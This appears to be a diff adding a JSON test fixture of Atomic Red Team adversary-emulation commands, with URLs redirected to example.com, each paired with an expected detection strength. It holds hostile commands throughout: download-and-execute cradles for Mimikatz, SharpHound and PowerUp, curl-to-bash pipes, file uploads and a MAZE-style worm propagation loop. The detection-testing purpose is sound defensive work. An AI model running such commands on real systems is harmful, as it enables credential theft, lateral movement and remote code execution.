@@ -1,0 +1,1344 @@
+{
+ "source": "Atomic Red Team atomics (Red Canary)",
+ "url": "https://github.com/redcanaryco/atomic-red-team/tree/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics",
+ "commit": "a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6",
+ "license": "MIT",
+ "license_text": "The MIT License\n\nCopyright (c) 2018 Red Canary, Inc.\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.",
+ "techniques": [
+  "T1105",
+  "T1059.001",
+  "T1059.004",
+  "T1140",
+  "T1218.005",
+  "T1218.010",
+  "T1218.011",
+  "T1197"
+ ],
+ "filters": {
+  "T1059.001": "download and IEX forms only",
+  "T1059.004": "curl/wget forms only"
+ },
+ "substitutions": "#{input} arguments resolved with each atomic's own default; external hostnames in URLs replaced with www.example.com and public IP addresses with 203.0.113.0/24, keeping the URL shape",
+ "entries": [
+  {
+   "name": "T1105 #0fc6e977 rsync remote file copy (push)",
+   "technique": "T1105",
+   "executor": "sh",
+   "lines": [
+    "rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #3180f7d5 rsync remote file copy (pull)",
+   "technique": "T1105",
+   "executor": "sh",
+   "lines": [
+    "rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #83a49600 scp remote file copy (push)",
+   "technique": "T1105",
+   "executor": "sh",
+   "lines": [
+    "scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #b9d22b9a scp remote file copy (pull)",
+   "technique": "T1105",
+   "executor": "sh",
+   "lines": [
+    "scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #f564c297 sftp remote file copy (push)",
+   "technique": "T1105",
+   "executor": "bash",
+   "lines": [
+    "sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #0139dba1 sftp remote file copy (pull)",
+   "technique": "T1105",
+   "executor": "sh",
+   "lines": [
+    "sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #dd3b61dd certutil download (urlcache)",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "cmd /c certutil -urlcache -split -f https://www.example.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1105 #ffd492e3 certutil download (verifyctl)",
+   "technique": "T1105",
+   "executor": "powershell",
+   "lines": [
+    "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"",
+    "New-Item -Path $datePath -ItemType Directory",
+    "Set-Location $datePath",
+    "certutil -verifyctl -split -f https://www.example.com/redcanaryco/atomic-red-team/master/LICENSE.txt",
+    "Get-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "medium",
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #a1921cd3 Windows - BITSAdmin BITS Download",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://www.example.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\\Atomic-license.txt"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1105 #42dc4460 Windows - PowerShell Download",
+   "technique": "T1105",
+   "executor": "powershell",
+   "lines": [
+    "(New-Object System.Net.WebClient).DownloadFile(\"https://www.example.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", \"$env:TEMP\\Atomic-license.txt\")"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1105 #2ca61766 OSTAP Worming Activity",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "pushd \\\\localhost\\C$",
+    "echo var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js",
+    "CScript.exe AtomicTestT1105.js //E:JScript",
+    "del AtomicTestT1105.js /Q >nul 2>&1",
+    "del AtomicTestFileT1105.js /Q >nul 2>&1",
+    "popd"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #fa5a2759 svchost writing a file to a UNC path",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe",
+    "C:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #815bef8b Download a File with Windows Defender MpCmdRun.exe",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"",
+    "MpCmdRun.exe -DownloadFile -url https://www.example.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\\Atomic-license.txt"
+   ],
+   "expected_min_strength": [
+    "none",
+    "strong"
+   ]
+  },
+  {
+   "name": "T1105 #c99a829f whois file download",
+   "technique": "T1105",
+   "executor": "sh",
+   "lines": [
+    "timeout --preserve-status 1 whois -h localhost -p 8443 \"Hello from Atomic Red Team test T1105\" > /tmp/T1105.whois.out"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #54a4daf1 File Download via PowerShell",
+   "technique": "T1105",
+   "executor": "powershell",
+   "lines": [
+    "(New-Object Net.WebClient).DownloadString('https://www.example.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1105 #5f507e45 File download with finger.exe on Windows",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "finger base64_filedata@localhost"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1105 #1a02df58 Download a file with IMEWDBLD.exe",
+   "technique": "T1105",
+   "executor": "powershell",
+   "lines": [
+    "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"",
+    "& $imewdbled https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #2b080b99 Curl Download File",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "C:\\Windows\\System32\\Curl.exe -k https://www.example.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll",
+    "C:\\Windows\\System32\\Curl.exe -k https://www.example.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\\users\\public\\music\\allthethingsx64.dll",
+    "C:\\Windows\\System32\\Curl.exe -k https://www.example.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\programdata\\allthethingsx64.dll",
+    "C:\\Windows\\System32\\Curl.exe -k https://www.example.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\\allthethingsx64.dll"
+   ],
+   "expected_min_strength": [
+    "weak",
+    "weak",
+    "weak",
+    "weak"
+   ]
+  },
+  {
+   "name": "T1105 #635c9a38 Curl Upload File",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "C:\\Windows\\System32\\Curl.exe -T c:\\temp\\atomictestfile.txt www.example.com",
+    "C:\\Windows\\System32\\Curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com",
+    "C:\\Windows\\System32\\Curl.exe -d c:\\temp\\atomictestfile.txt www.example.com",
+    "C:\\Windows\\System32\\Curl.exe --data c:\\temp\\atomictestfile.txt www.example.com"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #d239772b Download a file with Microsoft Connection Manager Auto-Download",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "\"PathToAtomicsFolder\\T1105\\src\\T1105.bat\" 1>NUL "
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #70f4d07c MAZE Propagation Script",
+   "technique": "T1105",
+   "executor": "powershell",
+   "lines": [
+    "$machine_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"",
+    "$offline_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"",
+    "$completed_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"",
+    "foreach ($machine in get-content -path \"$machine_list\")",
+    "{if (test-connection -Count 1 -computername $machine -quiet) ",
+    "{cmd /c copy \"$env:comspec\" \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\"",
+    "echo $machine >> \"$completed_list\"",
+    "wmic /node: \"$machine\" process call create \"regsvr32.exe /i C:\\Windows\\Temp\\T1105.exe\"}",
+    "else",
+    "{echo $machine >> \"$offline_list\"}}"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #49845fc1 Printer Migration Command-Line Tool UNC share folder into a zip file",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "del %TEMP%\\PrintBrm.zip >nul 2>&1 ",
+    "C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe -b -d \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\  -f %TEMP%\\PrintBrm.zip -O FORCE"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #54782d65 Lolbas replace.exe use to copy file",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "del %TEMP%\\redcanary.cab >nul 2>&1",
+    "C:\\Windows\\System32\\replace.exe \"PathToAtomicsFolder\\T1105\\src\\redcanary.cab\" %TEMP% /A"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #ed0335ac Lolbas replace.exe use to copy UNC file",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "del %TEMP%\\redcanary.cab >nul 2>&1",
+    "C:\\Windows\\System32\\replace.exe \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\redcanary.cab %TEMP% /A"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #6fdaae87 certreq download",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "certreq.exe -Post -config https://example.com c:\\windows\\win.ini %temp%\\Atomic-license.txt"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "T1105 #97116a3f Download a file using wscript",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "wscript.exe \"PathToAtomicsFolder\\T1105\\src\\T1105-download-file.vbs\""
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #bdc373c5 Linux Download File and Run",
+   "technique": "T1105",
+   "executor": "sh",
+   "lines": [
+    "curl -sO https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh; chmod +x atomic.sh | bash atomic.sh"
+   ],
+   "expected_min_strength": [
+    "weak"
+   ]
+  },
+  {
+   "name": "T1105 #b1729c57 Nimgrab - Transfer Files",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\" https://www.example.com/redcanaryco/atomic-red-team/master/LICENSE.txt $env:TEMP\\Atomic-license.txt"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1105 #c01cad7f iwr or Invoke Web-Request download",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "powershell.exe iwr -URI https://www.example.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\\Atomic-license.txt -UseBasicParsing"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1105 #66ee226e Arbitrary file download using the Notepad++ GUP.exe binary",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "mkdir \"c:\\Temp\"",
+    "cd PathToAtomicsFolder\\T1105\\bin\\",
+    "GUP.exe -unzipTo \"\" \"C:\\Temp\" \"Sample https://www.example.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6\""
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "strong"
+   ]
+  },
+  {
+   "name": "T1105 #5bcefe5f File download via nscurl",
+   "technique": "T1105",
+   "executor": "sh",
+   "lines": [
+    "nscurl -k \"https://www.example.com/redcanaryco/atomic-red-team/master/LICENSE.txt\" -o \"license.txt\""
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1105 #6934c16e File Download with Sqlcmd.exe",
+   "technique": "T1105",
+   "executor": "powershell",
+   "lines": [
+    "sqlcmd -i https://www.example.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\\T1105.zip"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #c82b1e60 Remote File Copy using PSCP",
+   "technique": "T1105",
+   "executor": "command_prompt",
+   "lines": [
+    "fsutil file createnew C:\\Temp\\T1105_scp.zip 1048576",
+    "echo y | PathToAtomicsFolder\\..\\ExternalPayloads\\pscp.exe -P 22 -pw atomic C:\\Temp\\T1105_scp.zip atomic@127.0.0.1:T1105_scp.zip"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #2a4b0d29 Windows push file using scp.exe",
+   "technique": "T1105",
+   "executor": "powershell",
+   "lines": [
+    "# Check if the folder exists, create it if it doesn't",
+    "$folderPath = \"C:\\temp\"",
+    "if (-Not (Test-Path -Path $folderPath)) {",
+    "    New-Item -Path $folderPath -ItemType Directory",
+    "}",
+    "# Create the file",
+    "$filePath = Join-Path -Path $folderPath -ChildPath \"T1105.txt\"",
+    "New-Item -Path $filePath -ItemType File -Force",
+    "Write-Output \"File created: $filePath\"",
+    "# Attack command",
+    "scp.exe C:\\temp\\T1105.txt adversary@adversary-host:/tmp/"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #401667dc Windows pull file using scp.exe",
+   "technique": "T1105",
+   "executor": "powershell",
+   "lines": [
+    "scp.exe adversary@adversary-host:/tmp/T1105.txt C:\\temp"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #205e676e Windows push file using sftp.exe",
+   "technique": "T1105",
+   "executor": "powershell",
+   "lines": [
+    "# Check if the folder exists, create it if it doesn't",
+    "$folderPath = \"C:\\temp\"",
+    "if (-Not (Test-Path -Path $folderPath)) {",
+    "    New-Item -Path $folderPath -ItemType Directory",
+    "}",
+    "# Create the file",
+    "$filePath = Join-Path -Path $folderPath -ChildPath \"T1105.txt\"",
+    "New-Item -Path $filePath -ItemType File -Force",
+    "Write-Output \"File created: $filePath\"",
+    "# Attack command",
+    "echo \"put C:\\temp\\T1105.txt\" | sftp adversary@adversary-host:/tmp"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #3d25f1f2 Windows pull file using sftp.exe",
+   "technique": "T1105",
+   "executor": "powershell",
+   "lines": [
+    "sftp.exe adversary@adversary-host:/tmp/T1105.txt C:\\temp"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #3dd6a6cf Download a file with OneDrive Standalone Updater",
+   "technique": "T1105",
+   "executor": "powershell",
+   "lines": [
+    "if (-not (Test-Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe\")) {",
+    "    Write-Host \"OneDriveStandaloneUpdater.exe not found at C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe. Test cannot continue.\"",
+    "    exit 1",
+    "}",
+    "New-Item -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Force | Out-Null",
+    "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"UpdateRingSettingURLFromOC\" -Value \"https://www.example.com/redcanaryco/atomic-red-team/master/LICENSE.txt\" -Type String -Force",
+    "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"ODSUUpdateXMLUrlFromOC\" -Value \"https://www.example.com/redcanaryco/atomic-red-team/master/LICENSE.txt\" -Type String -Force",
+    "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"UpdateXMLUrlFromOC\" -Value \"https://www.example.com/redcanaryco/atomic-red-team/master/LICENSE.txt\" -Type String -Force",
+    "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"UpdateOfficeConfigTimestamp\" -Value 99999999999 -Type QWord -Force",
+    "# Run OneDrive Standalone Updater",
+    "& \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe\""
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "strong",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1105 #7e2ad0db Curl Insecure Connection from a Pod",
+   "technique": "T1105",
+   "executor": "bash",
+   "lines": [
+    "kubectl run atomic-insecure-curl --image=curlimages/curl --restart=Never --rm -it -- curl -ksL https://www.example.com"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1059.001 #bf8c1441 Run Bloodhound from Memory using Download Cradle",
+   "technique": "T1059.001",
+   "executor": "powershell",
+   "lines": [
+    "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan",
+    "IEX (New-Object Net.Webclient).DownloadString('https://www.example.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');",
+    "Invoke-BloodHound -OutputDirectory $env:Temp",
+    "Start-Sleep 5"
+   ],
+   "expected_min_strength": [
+    "strong",
+    "strong",
+    "strong",
+    "none"
+   ]
+  },
+  {
+   "name": "T1059.001 #af1800cf Mimikatz - Cradlecraft PsSendKeys",
+   "technique": "T1059.001",
+   "executor": "powershell",
+   "lines": [
+    "$url='https://www.example.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "T1059.001 #06a220b6 Invoke-AppPathBypass",
+   "technique": "T1059.001",
+   "executor": "command_prompt",
+   "lines": [
+    "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://www.example.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\""
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1059.001 #388a7340 Powershell MsXml COM object - with prompt",
+   "technique": "T1059.001",
+   "executor": "command_prompt",
+   "lines": [
+    "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\""
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "T1059.001 #4396927f Powershell XML requests",
+   "technique": "T1059.001",
+   "executor": "command_prompt",
+   "lines": [
+    "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX\""
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "T1059.001 #8a2ad40b Powershell invoke mshta.exe download",
+   "technique": "T1059.001",
+   "executor": "command_prompt",
+   "lines": [
+    "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()\""
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "T1059.001 #fa050f5e PowerShell Fileless Script Execution",
+   "technique": "T1059.001",
+   "executor": "powershell",
+   "lines": [
+    "# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the Atomic Red Team\"\"",
+    "reg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\" /f",
+    "iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "medium"
+   ]
+  },
+  {
+   "name": "T1059.001 #8e5c5532 NTFS Alternate Data Stream Access",
+   "technique": "T1059.001",
+   "executor": "powershell",
+   "lines": [
+    "Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'",
+    "$streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt -Stream 'streamcommand'",
+    "Invoke-Expression $streamcommand"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1059.001 #1289f78d PowerUp Invoke-AllChecks",
+   "technique": "T1059.001",
+   "executor": "powershell",
+   "lines": [
+    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12",
+    "iex(iwr https://www.example.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)",
+    "Invoke-AllChecks"
+   ],
+   "expected_min_strength": [
+    "none",
+    "medium",
+    "medium"
+   ]
+  },
+  {
+   "name": "T1059.004 #d0c88567 Command-Line Interface",
+   "technique": "T1059.004",
+   "executor": "sh",
+   "lines": [
+    "curl -sS https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash",
+    "wget --quiet -O - https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash"
+   ],
+   "expected_min_strength": [
+    "weak",
+    "medium"
+   ]
+  },
+  {
+   "name": "T1059.004 #fca246a8 Detecting pipe-to-shell",
+   "technique": "T1059.004",
+   "executor": "sh",
+   "lines": [
+    "cd /tmp",
+    "curl -s https://www.example.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash",
+    "ls -la /tmp/art.txt      "
+   ],
+   "expected_min_strength": [
+    "none",
+    "weak",
+    "none"
+   ]
+  },
+  {
+   "name": "T1140 #dc6fe391 Deobfuscate/Decode Files Or Information",
+   "technique": "T1140",
+   "executor": "command_prompt",
+   "lines": [
+    "certutil -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc.txt",
+    "certutil -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe"
+   ],
+   "expected_min_strength": [
+    "none",
+    "medium"
+   ]
+  },
+  {
+   "name": "T1140 #71abc534 Certutil Rename and Decode",
+   "technique": "T1140",
+   "executor": "command_prompt",
+   "lines": [
+    "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp",
+    "%temp%\\tcm.tmp -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc2.txt",
+    "%temp%\\tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "T1140 #356dc0e8 Base64 decoding with Python",
+   "technique": "T1140",
+   "executor": "sh",
+   "lines": [
+    "ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(\"Hello from Atomic Red Team test T1140!\".encode());print(enc.decode())')",
+    "python3 -c \"import base64;dec=base64.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"",
+    "python3 -c \"import base64 as d;dec=d.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"",
+    "python3 -c \"from base64 import b64decode;dec=b64decode(\\\"$ENCODED\\\");print(dec.decode())\"",
+    "python3 -c \"from base64 import b64decode as d;dec=d(\\\"$ENCODED\\\");print(dec.decode())\"",
+    "echo $ENCODED | python3 -c \"import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())\"",
